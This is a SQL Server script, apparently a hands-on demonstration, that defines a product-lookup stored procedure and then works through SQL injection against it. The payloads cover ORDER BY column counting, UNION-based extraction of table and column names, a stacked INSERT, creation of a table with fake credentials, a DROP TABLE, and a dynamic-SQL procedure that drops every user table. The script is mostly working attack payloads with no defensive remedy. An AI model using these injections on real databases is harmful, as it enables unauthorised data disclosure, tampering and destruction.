-- Create store procedure to get product by name
ALTER PROCEDURE sp_GetProductByName
    @name AS VARCHAR(MAX)
AS
BEGIN
	IF EXISTS(SELECT TOP (1) * FROM dbo.Products WHERE Name = @name)
	BEGIN
		SELECT Id, Name, CategoryId, Image, Price, PromotionPrice, OriginalPrice,
               Description, Content, HomeFlag, HotFlag, ViewCount, Tags, Unit,
               SeoPageTitle, SeoAlias, SeoKeywords, SeoDescription, DateCreated,
               DateModified, Status 
		FROM dbo.Products 
		WHERE Name = @name;	
	END	
	ELSE
	BEGIN
	    RETURN;
	END

END
GO

EXEC sp_GetProductByName 'product 1'

-- Check Columns
/*Wrong */ 
SELECT TOP(1) Id, Name, CategoryId, Image, Price, PromotionPrice, OriginalPrice, Description, Content, HomeFlag, HotFlag, ViewCount, Tags, Unit, SeoPageTitle, SeoAlias, SeoKeywords, SeoDescription, DateCreated, DateModified, Status
FROM dbo.Products WHERE Name = 'product 1' ORDER BY 60 --
GO

/*Right*/ 
SELECT TOP(1) Id, Name, CategoryId, Image, Price, PromotionPrice, OriginalPrice, Description, Content, HomeFlag, HotFlag, ViewCount, Tags, Unit, SeoPageTitle, SeoAlias, SeoKeywords, SeoDescription, DateCreated, DateModified, Status 
FROM dbo.Products WHERE Name = 'product 1' ORDER BY 21 --
GO



-- Get table name
SELECT TOP(1) Id, Name, CategoryId, Image, Price, PromotionPrice, OriginalPrice, Description, Content, HomeFlag, HotFlag, ViewCount, Tags, Unit, SeoPageTitle, SeoAlias, SeoKeywords, SeoDescription, DateCreated, DateModified, Status 
FROM dbo.Products WHERE Name = 'product 1445435'
UNION ALL SELECT 1, TABLE_NAME, 3, '4', 5, 6, 7, '8', '9', 10, 11, 12, '13', '14', '15', '16', '17', '18', '19', '20', 21 FROM INFORMATION_SCHEMA.TABLES --
GO




-- Get columns name and data type
SELECT TOP(1) Id, Name, CategoryId, Image, Price, PromotionPrice, OriginalPrice, Description, Content, HomeFlag, HotFlag, ViewCount, Tags, Unit, SeoPageTitle, SeoAlias, SeoKeywords, SeoDescription, DateCreated, DateModified, Status 
FROM dbo.Products WHERE Name = 'product 1445435' union all 
SELECT 1, CONCAT(COLUMN_NAME, ' - ', DATA_TYPE), 3, '4', 5, 6, 7, '8', '9', 10, 11, 12, '13', '14', '15', '16', '17', '18', '19', '20', 21 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Products'
GO

-- Insert new product
SELECT TOP(1) Id, Name, CategoryId, Image, Price, PromotionPrice, OriginalPrice, Description, Content, HomeFlag, HotFlag, ViewCount, Tags, Unit, SeoPageTitle, SeoAlias, SeoKeywords, SeoDescription, DateCreated, DateModified, Status 
FROM dbo.Products WHERE Name = 'product 1445435';
INSERT dbo.Products (Name, CategoryId, Image, Price, PromotionPrice, OriginalPrice, Description, Content, HomeFlag, HotFlag, ViewCount, Tags, Unit, SeoPageTitle, SeoAlias, SeoKeywords, SeoDescription, DateCreated, DateModified, Status)
VALUES('hack', 1, 'hack', 0, 0, 0, 'hack', 'hack', 0, 0, 0, 'hack', 'hack', 'hack', 'hack', 'hack', 'hack', 'hack', 'hack', 0)
GO


-- Inject query to modify database
SELECT * FROM dbo.Products WHERE Id = 1;CREATE TABLE HackTable(Id INT PRIMARY KEY, UserName VARCHAR(MAX), UserPassword VARCHAR(MAX));INSERT INTO HackTable(Id, UserName, UserPassword)VALUES(1, 'hacker', 'hacker');
GO

SELECT * FROM dbo.HackTable

-- Inject query to drop a table
SELECT * FROM dbo.Products WHERE Id = 1; DROP TABLE HackTable;
GO

-- Inject query to drop all table 
CREATE PROCEDURE DROPALLTABLE @sql NVARCHAR(max)= '' AS BEGIN SELECT @sql += ' Drop table ' + QUOTENAME(s.NAME) + '.' + QUOTENAME(t.NAME) + '; ' FROM sys.tables t JOIN sys.schemas s ON t.[schema_id] = s.[schema_id] WHERE  t.type = 'U' PRINT @sql Exec sp_executesql @sql END; -- 
SELECT * FROM dbo.HackTable; EXEC DROPALLTABLE 'EXEC sp_msforeachtable "ALTER TABLE ? NOCHECK CONSTRAINT all";';--